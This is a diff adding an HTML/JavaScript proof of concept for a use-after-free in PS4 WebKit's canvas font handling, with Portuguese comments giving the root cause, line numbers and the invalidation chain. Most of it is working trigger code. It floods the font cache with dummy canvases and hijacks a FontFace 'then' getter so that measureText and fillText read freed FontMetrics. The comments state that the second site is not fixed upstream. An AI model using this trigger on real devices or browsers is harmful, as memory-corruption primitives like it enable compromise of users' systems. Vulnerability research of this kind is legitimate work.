@@ -1,43 +1,158 @@
 <!DOCTYPE html>
-<html>
-<body>
-<button id="run">Run</button>
+<!--
+  PS4 WebKit — FontMetrics Use-After-Free
+  CVE equivalente: commit 5ccd64b (WebKit upstream)
+
+  Root cause: CanvasRenderingContext2DBase::measureTextInternal() (linha 2786)
+  captura auto& fontMetrics = font.metricsOfPrimaryFont() ANTES de
+  font.width(textRun, &glyphOverflow). width() pode mutar o FontCache
+  e liberar o objeto FontMetrics. As leituras de fontMetrics após width()
+  são use-after-free.
+
+  Trigger (PS4 main thread, sem Worker/OffscreenCanvas):
+  - Thenable hijacking: Object.defineProperty(face, 'then') intercepta
+    o acesso interno do WebKit ao face.then durante o glyph walk de width().
+  - O getter injeta document.fonts.add() sincronamente, disparando:
+    fontModified → dispatchInvalidationCallbacks → fontsNeedUpdate
+    → retrieveOrAddCachedFonts → pruneUnreferencedEntries
+    → FontCascadeFonts da canvas liberado → fontMetrics → UAF → crash
+
+  Site 1 (measureTextInternal, linha 2786): CONFIRMADO COM CRASH
+  Site 2 (drawTextUnchecked,   linha 2663): testado abaixo via fillText
+-->
+<p>This test passes if it does not crash.</p>
 <script>
-document.getElementById('run').addEventListener('click', () => {
-    const dummies = [];
-    for (let i = 0; i < 200; i++) {
-        const c = document.createElement('canvas');
-        c.width = 1;
-        c.height = 1;
-        const dctx = c.getContext('2d');
-        dctx.font = '10px "d' + i + '_' + performance.now() + '"';
-        dummies.push(c, dctx);
-    }
+fetch('resources/Ahem.woff')
+  .then(function(r) { return r.arrayBuffer(); })
+  .then(function(b) {
+    return new Promise(function(res, rej) {
+      var fr = new FileReader();
+      fr.onload  = function(e) { res(e.target.result); };
+      fr.onerror = rej;
+      fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
+    });
+  })
+  .then(function(dataUrl) {
 
-    for (let i = 0; i < 64; i++) {
-        const fam = 'ahem_' + i + '_' + performance.now();
-        const face = new FontFace(fam, 'url("resources/Ahem.woff")');
-        document.fonts.add(face);
-        face.load();
+    /* ─────────────────────────────────────────────────────────────
+       SITE 1 — measureTextInternal (linha 2786 do PS4)
+       Vulnerável: fontMetrics capturada ANTES de font.width()
 
-        const canvas = document.createElement('canvas');
-        canvas.width = 32;
-        canvas.height = 32;
-        const ctx = canvas.getContext('2d');
+       Código vulnerável:
+         auto& font = *fontProxy();
+         auto& fontMetrics = font.metricsOfPrimaryFont();   ← antes
+         float fontWidth = font.width(textRun, &glyphOverflow);  ← width() invalida
+         metrics->setFontBoundingBoxAscent(fontMetrics.ascent()...); ← UAF
+       ───────────────────────────────────────────────────────────── */
+    (function testSite1() {
+      /* 500 dummies: cada ctx.font setter cria entrada no FontCascadeCache.
+         Com pruneUnreferencedEntries a cada 50 entradas (PS4), os 501 novos
+         entries criados pelo fontsNeedUpdate dos dummies garantem que a
+         entrada da canvas de teste seja purgada durante width(). */
+      var dummies = [];
+      for (var i = 0; i < 500; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1; d.height = 1;
+        d.getContext('2d').font = '10px "Z' + i + '"';
+        dummies.push(d);
+      }
 
-        for (let k = 0; k < 200; k++) {
-            ctx.font = '16px ' + fam + ', sans-serif';
-            const tm = ctx.measureText('ABCD');
-            void tm.width;
-            void tm.fontBoundingBoxAscent;
-            void tm.fontBoundingBoxDescent;
-            void tm.emHeightAscent;
-            void tm.emHeightDescent;
-            void tm.hangingBaseline;
-            void tm.ideographicBaseline;
+      /* FallbackFam carregada com dados reais de Ahem.woff.
+         Deve ficar em estado "loading" durante o measureText.
+         data: URL da Ahem real evita o NetworkError do PS4 que
+         bloqueia data: URLs sintéticas (como 'A'.repeat(1100000)). */
+      var face = new FontFace('FallbackFam', 'url("' + dataUrl + '")');
+      document.fonts.add(face);
+      void face.loaded; /* Inicia carregamento sem await — mantém estado loading */
+
+      var canvas = document.createElement('canvas');
+      canvas.width = 64; canvas.height = 64;
+      document.body.appendChild(canvas);
+      var ctx = canvas.getContext('2d');
+
+      /* Times = fonte primária (metricsOfPrimaryFont retorna Times).
+         FallbackFam = fallback para Cherokee U+13A0–13FF (ausente em Times).
+         Assim, width() usa FallbackFam para o glyph walk de \u13A0. */
+      ctx.font = '10px Times, FallbackFam';
+
+      /* Thenable hijacking:
+         Quando font.width() encontra FallbackFam pendente, o WebKit
+         acessa face.then internamente (trata FontFace como thenable).
+         O getter injeta document.fonts.add() sincronamente — isso dispara
+         a chain de invalidação dentro do stack de measureTextInternal. */
+      var reen = false;
+      Object.defineProperty(face, 'then', {
+        configurable: true,
+        get: function() {
+          if (reen) return undefined;
+          reen = true;
+          /* Adicionar qualquer FontFace nova dispara:
+             fontModified → dispatchInvalidationCallbacks → fontsNeedUpdate
+             → retrieveOrAddCachedFonts × (500 dummies + 1 canvas)
+             → pruneUnreferencedEntries (a cada 50 entradas, 10 vezes)
+             → V1's FontCascadeFonts liberada → fontMetrics → UAF */
+          document.fonts.add(new FontFace('Unrelated', 'local("x")'));
+          reen = false;
+          return undefined;
         }
-    }
-});
+      });
+
+      /* measureText → measureTextInternal:
+         L2786: auto& fontMetrics = font.metricsOfPrimaryFont() ← capturada
+         L2790: font.width() → glyph walk → face.then → chain → prune → free
+         L2797: fontMetrics.ascent() → USE-AFTER-FREE → CRASH */
+      ctx.measureText('\u13A0\u13A2\u13A4');
+    })();
+
+    /* ─────────────────────────────────────────────────────────────
+       SITE 2 — drawTextUnchecked (linha 2663 do PS4)
+       NÃO corrigido pelo commit upstream (só measureTextInternal foi fixado)
+
+       Código vulnerável:
+         auto& fontProxy = *this->fontProxy();
+         const auto& fontMetrics = fontProxy.metricsOfPrimaryFont(); ← antes
+         float fontWidth = fontProxy.width(textRun);                 ← width() invalida
+         FloatRect textRect(..., fontMetrics.height() / 2,           ← UAF
+                                 fontMetrics.ascent() + fontMetrics.lineGap(), ← UAF
+                                 fontMetrics.lineSpacing());          ← UAF
+       ───────────────────────────────────────────────────────────── */
+    (function testSite2() {
+      var dummies = [];
+      for (var i = 500; i < 1000; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1; d.height = 1;
+        d.getContext('2d').font = '10px "Z' + i + '"';
+        dummies.push(d);
+      }
+
+      var face2 = new FontFace('FallbackFam2', 'url("' + dataUrl + '")');
+      document.fonts.add(face2);
+      void face2.loaded;
+
+      var canvas2 = document.createElement('canvas');
+      canvas2.width = 64; canvas2.height = 64;
+      document.body.appendChild(canvas2);
+      var ctx2 = canvas2.getContext('2d');
+      ctx2.font = '10px Times, FallbackFam2';
+
+      var reen2 = false;
+      Object.defineProperty(face2, 'then', {
+        configurable: true,
+        get: function() {
+          if (reen2) return undefined;
+          reen2 = true;
+          document.fonts.add(new FontFace('Unrelated2', 'local("x")'));
+          reen2 = false;
+          return undefined;
+        }
+      });
+
+      /* fillText → drawTextUnchecked:
+         L2663: fontMetrics = fontProxy.metricsOfPrimaryFont() ← capturada
+         L2667: fontProxy.width(textRun) → face.then → chain → prune → free
+         L2674: fontMetrics.height() / fontMetrics.ascent() → UAF */
+      ctx2.fillText('\u13A0\u13A2\u13A4', 0, 32);
+    })();
+
+  });
 </script>
-</body>
-</html>
